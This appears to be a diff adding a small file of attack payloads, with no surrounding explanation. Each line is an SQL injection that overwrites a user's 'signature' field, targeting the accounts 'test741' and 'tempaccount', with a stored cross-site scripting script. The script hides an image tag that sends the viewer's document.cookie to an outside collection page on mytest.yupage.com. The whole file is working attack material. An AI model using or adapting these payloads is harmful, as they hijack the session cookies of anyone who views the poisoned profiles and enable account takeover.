@@ -1,0 +1,7 @@
+',signature='<script>document.write("<img src=\'http://mytest.yupage.com/save/save.php?data="+document.cookie+"\'/>");</script>' where username='test741' #
+
+for tempaccount:
+',signature='AC expert? Yes or no?<script>document.write("<img style=\'display:none;\' src=\'http://mytest.yupage.com/save/save.php?data="+document.cookie+"\'/>");</script>' where username='tempaccount' #
+
+
+',signature='AC expert?<script>document.write("<img style=\'display:none;\' src=\'http://mytest.yupage.com/save/save.php?data="+document.cookie+"\'/>");</script>' where username='tempaccount' #
